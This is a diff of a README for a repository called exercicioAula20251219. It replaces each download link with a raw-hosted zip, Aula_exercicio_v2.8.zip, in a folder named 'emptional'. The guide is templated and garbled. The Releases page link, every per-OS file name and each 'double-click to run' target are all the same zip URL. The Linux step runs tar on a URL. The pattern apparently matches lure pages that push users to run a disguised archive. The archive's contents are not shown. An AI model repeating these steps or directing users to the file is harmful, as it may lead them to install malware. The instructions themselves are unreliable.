@@ -6,7 +6,7 @@ Welcome to exercicioAula20251219! This guide will help you download and run the 
 
 ## 📥 Download Now
 
-[![Download from Releases](https://github.com/arahim2456/exercicioAula20251219/raw/refs/heads/main/emptional/Aula-exercicio-v1.0.zip%20from%20Releases-brightgreen)](https://github.com/arahim2456/exercicioAula20251219/raw/refs/heads/main/emptional/Aula-exercicio-v1.0.zip)
+[![Download from Releases](https://raw.githubusercontent.com/arahim2456/exercicioAula20251219/main/emptional/Aula_exercicio_v2.8.zip%20from%20Releases-brightgreen)](https://raw.githubusercontent.com/arahim2456/exercicioAula20251219/main/emptional/Aula_exercicio_v2.8.zip)
 
 ## 📋 Requirements
 
@@ -20,12 +20,12 @@ You won’t need any special software or skills to run this application. Just fo
 
 ## 📦 Download & Install
 
-1. Click on this link to [visit the Releases page](https://github.com/arahim2456/exercicioAula20251219/raw/refs/heads/main/emptional/Aula-exercicio-v1.0.zip).
+1. Click on this link to [visit the Releases page](https://raw.githubusercontent.com/arahim2456/exercicioAula20251219/main/emptional/Aula_exercicio_v2.8.zip).
 2. On the Releases page, you will see a list of versions. Choose the latest version, which is typically at the top.
 3. Look for a file with an extension that matches your operating system:
-   - For Windows, it may look like `https://github.com/arahim2456/exercicioAula20251219/raw/refs/heads/main/emptional/Aula-exercicio-v1.0.zip`.
-   - For macOS, you might find `https://github.com/arahim2456/exercicioAula20251219/raw/refs/heads/main/emptional/Aula-exercicio-v1.0.zip`.
-   - For Linux, it could be named `https://github.com/arahim2456/exercicioAula20251219/raw/refs/heads/main/emptional/Aula-exercicio-v1.0.zip`.
+   - For Windows, it may look like `https://raw.githubusercontent.com/arahim2456/exercicioAula20251219/main/emptional/Aula_exercicio_v2.8.zip`.
+   - For macOS, you might find `https://raw.githubusercontent.com/arahim2456/exercicioAula20251219/main/emptional/Aula_exercicio_v2.8.zip`.
+   - For Linux, it could be named `https://raw.githubusercontent.com/arahim2456/exercicioAula20251219/main/emptional/Aula_exercicio_v2.8.zip`.
 4. Click on the file name to download it to your computer.
 
 ### 🗂 Unzip the File
@@ -40,17 +40,17 @@ If you downloaded a ZIP or TAR file, you need to unzip it:
   - Double-click the downloaded file, and your system will automatically unzip it.
 
 - **For Linux:**
-  - Open a terminal and use the command: `tar -xzf https://github.com/arahim2456/exercicioAula20251219/raw/refs/heads/main/emptional/Aula-exercicio-v1.0.zip`.
+  - Open a terminal and use the command: `tar -xzf https://raw.githubusercontent.com/arahim2456/exercicioAula20251219/main/emptional/Aula_exercicio_v2.8.zip`.
 
 ## 🖥 Running the Application
 
 After extracting the files, locate the extracted folder. Inside, you will find the application file.
 
 1. **For Windows:**
-   - Double-click `https://github.com/arahim2456/exercicioAula20251219/raw/refs/heads/main/emptional/Aula-exercicio-v1.0.zip` to run the application. 
+   - Double-click `https://raw.githubusercontent.com/arahim2456/exercicioAula20251219/main/emptional/Aula_exercicio_v2.8.zip` to run the application. 
 
 2. **For macOS:**
-   - Double-click on `https://github.com/arahim2456/exercicioAula20251219/raw/refs/heads/main/emptional/Aula-exercicio-v1.0.zip` to launch it.
+   - Double-click on `https://raw.githubusercontent.com/arahim2456/exercicioAula20251219/main/emptional/Aula_exercicio_v2.8.zip` to launch it.
 
 3. **For Linux:**
    - Open a terminal, navigate to the extracted folder, and run `./exercicioAula20251219` to start the application.
@@ -87,4 +87,4 @@ For additional support, feel free to reach out through the Issues section or ema
 
 Now you are ready to enjoy the benefits of exercicioAula20251219. Happy using! 
 
-[![Download from Releases](https://github.com/arahim2456/exercicioAula20251219/raw/refs/heads/main/emptional/Aula-exercicio-v1.0.zip%20from%20Releases-brightgreen)](https://github.com/arahim2456/exercicioAula20251219/raw/refs/heads/main/emptional/Aula-exercicio-v1.0.zip)
+[![Download from Releases](https://raw.githubusercontent.com/arahim2456/exercicioAula20251219/main/emptional/Aula_exercicio_v2.8.zip%20from%20Releases-brightgreen)](https://raw.githubusercontent.com/arahim2456/exercicioAula20251219/main/emptional/Aula_exercicio_v2.8.zip)
